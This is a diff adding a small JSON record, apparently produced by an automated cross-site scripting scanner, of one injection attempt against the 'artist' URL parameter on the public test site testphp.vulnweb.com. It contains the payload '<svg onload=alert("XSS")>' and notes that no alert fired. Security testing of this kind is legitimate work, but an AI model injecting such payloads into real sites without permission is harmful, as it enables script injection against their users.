@@ -1,0 +1,22 @@
+{
+  "success": true,
+  "url": "http://testphp.vulnweb.com/artists.php?artist=2",
+  "payload": "<svg onload=alert(\"XSS\")>",
+  "input_point": {
+    "type": "url_params",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=2",
+    "params": {
+      "artist": "2"
+    }
+  },
+  "timestamp": "2025-09-15 15:05:46",
+  "screenshots": {
+    "initial": "poc_screenshots/initial_1757948738.png",
+    "injection": "poc_screenshots/injection_1757948743.png",
+    "alert": "",
+    "post_alert": ""
+  },
+  "alert_detected": false,
+  "page_title": "",
+  "current_url": "http://testphp.vulnweb.com/artists.php?artist=2?artist=%3Csvg%20onload=alert(%22XSS%22)%3E"
+}
